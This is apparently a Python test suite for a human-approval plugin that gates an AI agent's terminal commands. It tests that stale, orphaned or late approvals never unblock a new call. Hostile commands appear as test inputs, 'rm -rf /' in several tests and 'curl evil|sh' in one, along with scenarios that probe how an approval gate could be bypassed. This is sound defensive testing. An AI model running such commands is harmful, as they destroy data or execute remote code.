"""Contract K2.1 (action_id correlation OFF): per-instance lock, pre-request baseline poll,
persisted consumed/abandoned workitems.

AMP's get-decision returns the instance's newest workitem (ORDER BY created DESC LIMIT 1,
any status), so without action_id a call cannot tell its own workitem from an older one.
"""

from __future__ import annotations

import itertools
import json
from pathlib import Path
import tempfile
import threading
import time
import unittest
from unittest.mock import Mock, patch

from hermes.amp_client import AmpClientError
from hermes.policy import NormalizedAction
from hermes.session_store import SessionRecord, SessionStore
from hitl_helpers import FakeClock, complete, make_plugin, pending, quiet

_real_sleep = time.sleep


def _governed(plugin, *, args=None, clock=None):
    clock = clock or FakeClock()
    with quiet(plugin), clock.installed():
        return plugin.pre_tool_call(tool_name="terminal", args=args or {"command": "ls"}, session_id="s1")


class BaselineTests(unittest.TestCase):
    def test_restart_old_approval_from_baseline_is_never_accepted(self) -> None:
        """(a) Fresh process, same instance_id: the old approval must not let a new call run."""
        plugin = make_plugin(hitl_timeout_minutes=1)  # fresh ledger = fresh process
        plugin._client.request_hitl = Mock(return_value={"status": "waiting-for-response"})
        plugin._client.get_hitl_decision = Mock(return_value=complete("approve", "wi-old"))
        result = _governed(plugin)
        assert result is not None
        self.assertEqual(result["action"], "block")

    def test_orphan_pending_from_baseline_is_never_bound(self) -> None:
        """(b) Baseline sees pending wi-orphan; its later approval must not allow this call."""
        plugin = make_plugin(hitl_timeout_minutes=1)
        plugin._client.request_hitl = Mock(return_value={"status": "waiting-for-response"})
        plugin._client.get_hitl_decision = Mock(side_effect=itertools.chain(
            [pending("wi-orphan"), pending("wi-orphan")],
            itertools.repeat(complete("approve", "wi-orphan")),
        ))
        result = _governed(plugin)
        assert result is not None
        self.assertEqual(result["action"], "block")

    def test_own_workitem_after_baseline_is_accepted(self) -> None:
        plugin = make_plugin()
        plugin._client.request_hitl = Mock(return_value={"status": "waiting-for-response"})
        plugin._client.get_hitl_decision = Mock(side_effect=[
            complete("approve", "wi-old"),       # baseline
            complete("approve", "wi-old"),       # agent-hitl has not created ours yet
            pending("wi-new"),
            complete("approve", "wi-new"),
        ])
        self.assertIsNone(_governed(plugin))
        self.assertEqual(plugin._client.get_hitl_decision.call_count, 4)

    def test_baseline_poll_happens_before_the_request(self) -> None:
        plugin = make_plugin()
        order = []
        plugin._client.get_hitl_decision = Mock(side_effect=lambda *a, **k: order.append("poll") or pending("wi-1"))
        plugin._client.request_hitl = Mock(side_effect=lambda *a, **k: order.append("request") or {"status": "no-hitl"})
        self.assertIsNone(_governed(plugin))
        self.assertEqual(order, ["poll", "request"])

    def test_baseline_4xx_blocks_even_when_fail_open(self) -> None:
        plugin = make_plugin(fail_closed=False)
        plugin._client.get_hitl_decision = Mock(side_effect=AmpClientError("HTTP 429", status_code=429))
        plugin._client.request_hitl = Mock(return_value={"status": "no-hitl"})
        result = _governed(plugin)
        assert result is not None
        self.assertIn("HTTP 429", result["message"])
        plugin._client.request_hitl.assert_not_called()

    def test_baseline_outage_blocks_when_fail_closed(self) -> None:
        plugin = make_plugin(fail_closed=True)
        plugin._client.get_hitl_decision = Mock(side_effect=AmpClientError("connection refused"))
        plugin._client.request_hitl = Mock(return_value={"status": "no-hitl"})
        result = _governed(plugin)
        assert result is not None
        self.assertIn("unavailable", result["message"])

    def test_baseline_outage_fail_open_never_accepts_unbound_decision(self) -> None:
        plugin = make_plugin(fail_closed=False, hitl_timeout_minutes=1)
        plugin._client.get_hitl_decision = Mock(side_effect=itertools.chain(
            [AmpClientError("connection refused")], itertools.repeat(complete("approve", "wi-x")),
        ))
        plugin._client.request_hitl = Mock(return_value={"status": "waiting-for-response"})
        result = _governed(plugin)
        assert result is not None
        self.assertEqual(result["action"], "block")

    def test_baseline_outage_fail_open_still_allows_no_hitl(self) -> None:
        # Existing outage semantics: AMP's own allow is still honoured.
        plugin = make_plugin(fail_closed=False)
        plugin._client.get_hitl_decision = Mock(side_effect=AmpClientError("connection refused"))
        plugin._client.request_hitl = Mock(return_value={"status": "no-hitl"})
        self.assertIsNone(_governed(plugin))

    def test_flag_on_path_has_no_baseline(self) -> None:
        """(d) action_id correlation ON: unchanged, no baseline poll."""
        plugin = make_plugin(action_id_correlation=True)
        plugin._client.request_hitl = Mock(return_value=pending("wi-1", action_id="c1"))
        plugin._client.get_hitl_decision = Mock(return_value=complete("approve", "wi-1", action_id="c1"))
        with quiet(plugin), FakeClock().installed():
            result = plugin.pre_tool_call(tool_name="terminal", args={"command": "ls"}, session_id="s1",
                                          tool_call_id="c1")
        self.assertIsNone(result)
        self.assertEqual(plugin._client.get_hitl_decision.call_count, 1)

    def test_llm_path_uses_baseline(self) -> None:
        from test_enforcement import _make_exec_ctx

        plugin = make_plugin(llm_governance_enabled=True, llm_governance_mode="enforce", hitl_timeout_minutes=1)
        exec_ctx = _make_exec_ctx()
        plugin._client.request_llm_hitl = Mock(return_value={"status": "waiting-for-response"})
        plugin._client.get_hitl_decision = Mock(return_value=complete("approve", "wi-old"))
        with patch.object(plugin, "_safe_log"), FakeClock().installed():
            decision, _ = plugin._evaluate_llm_governance(exec_ctx, "m", "p", "", "s1", {"messages": []}, 1)
        self.assertEqual(decision, "block")

    def test_plan_path_uses_baseline(self) -> None:
        from test_plan_governance import _valid_plan

        plugin = make_plugin(hitl_timeout_minutes=1)
        plugin._client.request_plan_approval = Mock(return_value={"status": "waiting-for-response"})
        plugin._client.get_hitl_decision = Mock(return_value=complete("approve", "wi-old"))
        with quiet(plugin), FakeClock().installed():
            result = plugin.evaluate_proposed_plan("s1", _valid_plan())
        self.assertEqual(result["status"], "timed_out")


class ConcurrentCallsTests(unittest.TestCase):
    def test_each_call_allows_only_on_its_own_workitem(self) -> None:
        """(c) Two threads on one instance: the reviewer approves only the safe call."""
        backend = _FakeBackend()
        # 0.2 min = 12 s of real time at most; the stub resolves within a few polls.
        plugin = make_plugin(hitl_poll_interval_seconds=1, hitl_timeout_minutes=0.2)
        plugin._client.request_hitl = Mock(side_effect=backend.request)
        plugin._client.get_hitl_decision = Mock(side_effect=backend.get_decision)
        results = {}

        def run(command):
            results[command] = plugin.pre_tool_call(tool_name="terminal", args={"command": command}, session_id="s1")

        with patch.object(plugin, "_safe_log"), patch.object(plugin, "_ensure_instance", return_value="inst-1"), \
             patch("time.sleep", lambda _s: _real_sleep(0.002)):
            threads = [threading.Thread(target=run, args=(c,)) for c in ("echo safe", "rm -rf /")]
            for thread in threads:
                thread.start()
            for thread in threads:
                thread.join(30)
        self.assertIsNone(results["echo safe"])
        self.assertEqual(results["rm -rf /"]["action"], "block")
        self.assertIn("rejected", results["rm -rf /"]["message"])


class _FakeBackend:
    """Instance-scoped get-decision like AMP: newest workitem, any status. The reviewer
    approves 'echo safe' and rejects anything else after two polls of a workitem."""

    def __init__(self) -> None:
        self._lock = threading.Lock()
        self._items = []  # dicts: id, command, status, resolution, polls
        self._ids = itertools.count(1)

    def request(self, _instance_id, action, **_kwargs):
        with self._lock:
            self._items.append({"id": f"wi-{next(self._ids)}", "command": action.context["command"],
                                "status": "pending", "resolution": "", "polls": 0})
        return {"status": "waiting-for-response"}

    def get_decision(self, _instance_id, **_kwargs):
        with self._lock:
            if not self._items:
                return {"status": "pending"}
            item = self._items[-1]
            item["polls"] += 1
            if item["status"] == "pending" and item["polls"] > 2:
                item["status"] = "complete"
                item["resolution"] = "approve" if item["command"] == "echo safe" else "reject"
            if item["status"] == "complete":
                return complete(item["resolution"], item["id"])
            return pending(item["id"])


class PersistedSpentTests(unittest.TestCase):
    def setUp(self) -> None:
        self._tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self._tmp.cleanup)
        self.path = Path(self._tmp.name) / "sessions.json"

    def test_consumed_workitems_survive_a_restart(self) -> None:
        store = SessionStore(path=self.path)
        store.put(SessionRecord("s1", "inst-1"))
        first = make_plugin()
        first._store = store
        first._client.request_hitl = Mock(return_value={"status": "waiting-for-response"})
        first._client.get_hitl_decision = Mock(side_effect=[{"status": "pending"}, pending("wi-1"),
                                                            complete("approve", "wi-1")])
        self.assertIsNone(_governed(first))
        self.assertIn("wi-1", SessionStore(path=self.path).spent_for_instance("inst-1"))

        restarted = make_plugin()
        restarted._store = SessionStore(path=self.path)
        restarted._ensure_ledger_seeded("inst-1")
        self.assertTrue(restarted._ledger.is_spent("inst-1", "wi-1"))

    def test_spent_list_is_bounded(self) -> None:
        store = SessionStore(path=self.path)
        store.put(SessionRecord("s1", "inst-1"))
        for n in range(80):
            store.remember_spent("inst-1", f"wi-{n}")
        spent = store.spent_for_instance("inst-1")
        self.assertEqual(len(spent), 50)
        self.assertEqual(spent[-1], "wi-79")

    def test_bad_spent_field_drops_record(self) -> None:
        self.path.write_text(json.dumps({
            "s1": {"session_id": "s1", "instance_id": "i1", "spent_workitem_ids": "not-a-list"},
            "s2": {"session_id": "s2", "instance_id": "i2", "spent_workitem_ids": ["wi-1"]},
        }))
        store = SessionStore(path=self.path)
        self.assertIsNone(store.get("s1"))
        self.assertEqual(store.get("s2").spent_workitem_ids, ["wi-1"])


if __name__ == "__main__":
    unittest.main()


class _RowBackend:
    """Instance-scoped like AMP: newest row by `created` (1 s precision), any status."""

    def __init__(self, clock: FakeClock) -> None:
        self.clock = clock
        self.rows = []
        self.on_poll = []
        self.polls = 0
        self.requests = 0

    def add(self, wid, created=None):
        self.rows.append({"id": wid, "created": int(self.clock.now if created is None else created),
                          "status": "Pending", "resolution": None})

    def set(self, wid, resolution):
        for row in self.rows:
            if row["id"] == wid:
                row["status"], row["resolution"] = "Complete", resolution

    def get_decision(self, *_a, **_k):
        self.polls += 1
        for hook in list(self.on_poll):
            hook(self.polls)
        if not self.rows:
            return {"status": "pending"}
        top = max(r["created"] for r in self.rows)
        row = [r for r in self.rows if r["created"] == top][-1]
        if row["status"] == "Complete":
            return complete(row["resolution"], row["id"])
        return pending(row["id"])

    def request(self, *_a, **_k):
        self.requests += 1
        return {"status": "waiting-for-response"}


class K21ReviewFindingTests(unittest.TestCase):
    """Gate 2/3 findings on K2.1: late workitems, cross-process, budget, action_id path."""

    def _call(self, plugin, clock, command, **kwargs):
        with quiet(plugin), clock.installed():
            return plugin.pre_tool_call(tool_name="terminal", args={"command": command}, session_id="s1", **kwargs)

    def test_late_workitem_of_unbound_call_never_decides_the_next_call(self) -> None:
        clock = FakeClock()
        backend = _RowBackend(clock)
        plugin = make_plugin(hitl_timeout_minutes=1)
        plugin._client.get_hitl_decision = Mock(side_effect=backend.get_decision)
        plugin._client.request_hitl = Mock(side_effect=backend.request)
        self.assertEqual(self._call(plugin, clock, "ls")["action"], "block")  # A: no workitem ever seen
        state = {}

        def late_rows(n):
            if "a" not in state and backend.requests == 2:
                backend.add("W-A-benign")
                state["a"] = n
            if "a" in state and n >= state["a"] + 2:
                backend.set("W-A-benign", "approve")

        backend.on_poll.append(late_rows)
        result = self._call(plugin, clock, "rm -rf /")
        assert result is not None
        self.assertEqual(result["action"], "block")

    def test_next_call_waits_while_previous_review_is_unregistered(self) -> None:
        clock = FakeClock()
        plugin = make_plugin(hitl_timeout_minutes=1)
        plugin._client.request_hitl = Mock(return_value={"status": "waiting-for-response"})
        plugin._client.get_hitl_decision = Mock(return_value={"status": "pending"})
        self._call(plugin, clock, "ls")
        plugin._client.request_hitl.reset_mock()
        result = self._call(plugin, clock, "pwd")
        self.assertIn("not been registered", result["message"])
        plugin._client.request_hitl.assert_not_called()

    def test_unregistered_marker_expires(self) -> None:
        clock = FakeClock()
        plugin = make_plugin(hitl_timeout_minutes=1)
        plugin._client.request_hitl = Mock(return_value={"status": "waiting-for-response"})
        plugin._client.get_hitl_decision = Mock(return_value={"status": "pending"})
        self._call(plugin, clock, "ls")
        clock.now += 3600
        plugin._client.request_hitl = Mock(return_value={"status": "no-hitl"})
        self.assertIsNone(self._call(plugin, clock, "pwd"))

    def test_new_row_after_unregistered_call_is_treated_as_spent(self) -> None:
        clock = FakeClock()
        plugin = make_plugin(hitl_timeout_minutes=1)
        plugin._client.request_hitl = Mock(return_value={"status": "waiting-for-response"})
        plugin._client.get_hitl_decision = Mock(return_value={"status": "pending"})
        self._call(plugin, clock, "ls")
        plugin._client.get_hitl_decision = Mock(return_value=pending("W-late"))  # A's row finally exists
        plugin._client.request_hitl = Mock(return_value={"status": "no-hitl"})
        self.assertIsNone(self._call(plugin, clock, "pwd"))
        self.assertTrue(plugin._ledger.is_spent("inst-1", "W-late"))

    def test_two_processes_on_one_instance_cannot_swap(self) -> None:
        clock = FakeClock()
        backend = _RowBackend(clock)
        first, second = make_plugin(), make_plugin()  # same HERMES_HOME = same state dir
        for plugin in (first, second):
            plugin._client.get_hitl_decision = Mock(side_effect=backend.get_decision)
        danger = NormalizedAction("terminal", "exec", "exec", {"command": "rm -rf /"})
        benign = NormalizedAction("terminal", "exec", "exec", {"command": "ls"})
        nested = {}

        def second_request(*_a, **_k):
            backend.add("W-2-benign")
            return {"status": "waiting-for-response"}

        def first_request(*_a, **_k):
            backend.add("W-1-danger")
            clock.now += 1
            nested["second"] = second._evaluate_governance("inst-1", benign)
            return {"status": "waiting-for-response"}

        first._client.request_hitl = Mock(side_effect=first_request)
        second._client.request_hitl = Mock(side_effect=second_request)
        backend.on_poll.append(lambda n: backend.set("W-2-benign", "approve") if n > 3 else None)
        with quiet(first), quiet(second), clock.installed():
            result = first._evaluate_governance("inst-1", danger)
        assert result is not None
        self.assertEqual(result["action"], "block")
        self.assertEqual(nested["second"]["action"], "block")
        second._client.request_hitl.assert_not_called()

    def test_action_id_path_also_takes_the_instance_lock(self) -> None:
        plugin = make_plugin(action_id_correlation=True, hitl_timeout_minutes=1)
        plugin._client.request_hitl = Mock(return_value={"status": "no-hitl"})
        lock = plugin._instance_lock("inst-1")
        lock.acquire()
        try:
            result = self._call(plugin, FakeClock(), "ls", tool_call_id="c1")
        finally:
            lock.release()
        self.assertIn("One approval at a time", result["message"])
        plugin._client.request_hitl.assert_not_called()

    def test_no_request_when_budget_is_gone_before_posting(self) -> None:
        clock = FakeClock()
        plugin = make_plugin(hitl_timeout_minutes=1)

        def slow_baseline(*_a, **_k):
            clock.now += 59  # budget ends at +45 (60 - 15 margin)
            return {"status": "pending"}

        plugin._client.get_hitl_decision = Mock(side_effect=slow_baseline)
        plugin._client.request_hitl = Mock(return_value={"status": "no-hitl"})
        result = self._call(plugin, clock, "ls")
        self.assertEqual(result["action"], "block")
        plugin._client.request_hitl.assert_not_called()

    def test_baseline_failure_never_binds_via_pending_poll(self) -> None:
        plugin = make_plugin(fail_closed=False, hitl_timeout_minutes=1)
        plugin._client.get_hitl_decision = Mock(side_effect=itertools.chain(
            [AmpClientError("connection refused"), pending("wi-x")],
            itertools.repeat(complete("approve", "wi-x")),
        ))
        plugin._client.request_hitl = Mock(return_value={"status": "waiting-for-response"})
        self.assertEqual(_governed(plugin)["action"], "block")

    def test_llm_path_blocks_without_instance_id(self) -> None:
        from test_enforcement import _make_exec_ctx

        plugin = make_plugin(llm_governance_enabled=True, llm_governance_mode="enforce")
        exec_ctx = _make_exec_ctx(instance_id="")
        plugin._client.request_llm_hitl = Mock(return_value={"status": "no-hitl"})
        with patch.object(plugin, "_safe_log"), FakeClock().installed():
            decision, _ = plugin._evaluate_llm_governance(exec_ctx, "m", "p", "", "s1", {"messages": []}, 1)
        self.assertEqual(decision, "block")
        plugin._client.request_llm_hitl.assert_not_called()


class K21SecondReviewTests(unittest.TestCase):
    """Second gate-2/3 round on the late-workitem guard (S7-S10) and lock release."""

    def _call(self, plugin, clock, command, **kwargs):
        with quiet(plugin), clock.installed():
            return plugin.pre_tool_call(tool_name="terminal", args={"command": command}, session_id="s1", **kwargs)

    def _late_row_then_approve(self, backend, after_requests):
        state = {}

        def hook(n):
            if "late" not in state and backend.requests >= after_requests:
                backend.add("W-late")
                state["late"] = n
            if "late" in state and n >= state["late"] + 2:
                backend.set("W-late", "approve")

        backend.on_poll.append(hook)

    def test_marker_survives_a_new_process(self) -> None:
        """S7: the next call runs in a new process (fresh plugin, same state dir)."""
        clock = FakeClock()
        backend = _RowBackend(clock)
        first = make_plugin(hitl_timeout_minutes=1)
        first._store.put(SessionRecord("s1", "inst-1"))
        first._client.get_hitl_decision = Mock(side_effect=backend.get_decision)
        first._client.request_hitl = Mock(side_effect=backend.request)
        self._call(first, clock, "ls")  # no workitem ever seen
        second = make_plugin(hitl_timeout_minutes=1)
        second._client.get_hitl_decision = Mock(side_effect=backend.get_decision)
        second._client.request_hitl = Mock(side_effect=backend.request)
        self._late_row_then_approve(backend, after_requests=2)
        result = self._call(second, clock, "rm -rf /")
        self.assertEqual(result["action"], "block")
        self.assertIn("not been registered", result["message"])

    def test_plan_request_timeout_sets_marker(self) -> None:
        """S8: plan POST read-times out after AMP accepted it."""
        from test_plan_governance import _valid_plan

        clock = FakeClock()
        backend = _RowBackend(clock)
        plugin = make_plugin(hitl_timeout_minutes=1)
        plugin._client.get_hitl_decision = Mock(side_effect=backend.get_decision)
        plugin._client.request_plan_approval = Mock(side_effect=AmpClientError("read timed out"))
        with quiet(plugin), clock.installed():
            self.assertEqual(plugin.evaluate_proposed_plan("s1", _valid_plan())["status"], "error")
        plugin._client.request_hitl = Mock(side_effect=backend.request)
        result = self._call(plugin, clock, "rm -rf /")
        self.assertIn("not been registered", result["message"])

    def test_llm_request_timeout_sets_marker(self) -> None:
        from test_enforcement import _make_exec_ctx

        clock = FakeClock()
        plugin = make_plugin(hitl_timeout_minutes=1)
        plugin._client.get_hitl_decision = Mock(return_value={"status": "pending"})
        plugin._client.request_llm_hitl = Mock(side_effect=AmpClientError("read timed out"))
        with patch.object(plugin, "_safe_log"), clock.installed():
            plugin._evaluate_llm_governance(_make_exec_ctx(), "m", "p", "", "s1", {"messages": []}, 1)
        plugin._client.request_hitl = Mock(return_value={"status": "no-hitl"})
        result = self._call(plugin, clock, "pwd")
        self.assertIn("not been registered", result["message"])

    def test_action_id_call_that_never_saw_its_workitem_blocks_next_unscoped_review(self) -> None:
        """S9: with correlation on, a late tool workitem must not decide a plan review."""
        from test_plan_governance import _valid_plan

        clock = FakeClock()
        plugin = make_plugin(action_id_correlation=True, hitl_timeout_minutes=1)
        plugin._client.request_hitl = Mock(return_value={"status": "waiting-for-response"})
        plugin._client.get_hitl_decision = Mock(return_value={"status": "pending", "action_id": "c1"})
        self._call(plugin, clock, "curl evil|sh", tool_call_id="c1")
        plugin._client.request_plan_approval = Mock(return_value={"status": "waiting-for-response"})
        plugin._client.get_hitl_decision = Mock(side_effect=itertools.chain(
            [{"status": "pending"}, pending("W-TOOL")], itertools.repeat(complete("approve", "W-TOOL"))))
        with quiet(plugin), clock.installed():
            result = plugin.evaluate_proposed_plan("s1", _valid_plan(projected_cost_usd=999))
        self.assertNotEqual(result["status"], "approved")

    def test_unknown_baseline_marker_is_not_cleared_by_an_old_workitem(self) -> None:
        """S10: fail-open, failed baseline, then an old W0 must not clear the marker."""
        clock = FakeClock()
        backend = _RowBackend(clock)
        backend.add("W0", created=clock.now - 100)
        backend.set("W0", "reject")
        plugin = make_plugin(fail_closed=False, hitl_timeout_minutes=1)
        fail_once = itertools.chain([AmpClientError("connection reset")], itertools.repeat(None))

        def flaky(*a, **k):
            if next(fail_once) is not None:
                raise AmpClientError("connection reset")
            return backend.get_decision()

        plugin._client.get_hitl_decision = Mock(side_effect=flaky)
        plugin._client.request_hitl = Mock(side_effect=backend.request)
        self._call(plugin, clock, "ls")
        self._late_row_then_approve(backend, after_requests=2)
        result = self._call(plugin, clock, "rm -rf /")
        self.assertEqual(result["action"], "block")

    def test_thread_lock_released_even_if_file_unlock_fails(self) -> None:
        import hermes as mod

        plugin = make_plugin()
        plugin._client.get_hitl_decision = Mock(return_value={"status": "pending"})
        with patch.object(mod._InstanceFileLock, "release", side_effect=OSError("unlock failed")):
            with self.assertRaises(OSError):
                with plugin._review_slot("inst-1", deadline=time.time() + 5):
                    pass
        self.assertTrue(plugin._instance_lock("inst-1").acquire(blocking=False))
